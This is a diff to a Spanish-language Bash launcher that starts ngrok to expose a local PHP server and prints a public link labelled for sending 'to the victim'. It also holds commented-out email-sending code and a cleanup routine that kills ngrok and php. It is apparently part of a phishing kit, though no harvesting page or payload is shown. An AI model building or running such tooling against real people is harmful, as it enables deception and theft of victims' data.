@@ -1,5 +1,7 @@
 
 #!/bin/bash
+trap 'printf "\n";stop;exit 1' 2
+
 
 link="localhost:8080"
 v="\e[1;91m"
@@ -12,8 +14,8 @@ echo
 echo -e "$v[$b*$v]$b Enpezando..."
 sleep 2
 
-#findngrok
-./ngrok http $link > /dev/null &
+findngrok
+./ngrok http $link > /dev/null 2>&1 &
 echo -e "$v[$b*$v]$b Verifica una buena conexión de internet"
 sleep 7
 echo -e "$v[$b*$v]$b Abriendo ngrok..."
@@ -27,8 +29,9 @@ exit 1
 else
 echo -e "$v[$b*$v]$b $link"
 echo -e "$v[$b*$v]$b Envia a la victima > \e[0;32m$envialink"
-cd $ruta_carpeta
 fi
+#cd $ruta_carpeta
+
 # cutt
 # if [[ $add7 == "7" ]];then
 # echo -e "$v[$b*$v]$b Enviando email..."
@@ -79,9 +82,14 @@ fi
 }
 stop() {
 checkng=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
 if [[ $checkng == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null &
-killall -f ngrok > /dev/null &
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
 fi
 }
 
